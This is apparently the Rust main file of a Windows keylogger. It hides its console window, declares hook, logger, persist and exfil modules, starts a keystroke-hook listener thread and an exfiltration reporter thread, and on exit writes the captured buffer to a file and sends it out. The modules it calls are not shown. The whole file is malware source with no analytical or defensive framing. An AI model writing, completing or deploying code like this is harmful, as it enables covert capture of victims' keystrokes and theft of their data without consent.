#![windows_subsystem = "windows"]

// Modules are declared here for the binary target.
// (lib.rs has its own `pub mod` declarations for the DLL target.)
mod config;
mod exfil;
mod hook;
mod logger;
mod lua_engine;
mod persist;

fn main() {
    if let Err(e) = lua_engine::init() {
        eprintln!("[diag] scripting unavailable: {}", e);
    }

    ctrlc::set_handler(move || {
        hook::stop_hook();
    })
    .ok();

    let listener_thread = hook::start_hook();
    let _reporter_thread = exfil::start_exfil_thread();

    listener_thread.join().ok();

    let remaining = logger::take_buffer();
    if !remaining.is_empty() {
        logger::write_to_file(&remaining);
        let _ = exfil::send_data(&remaining);
    }
}
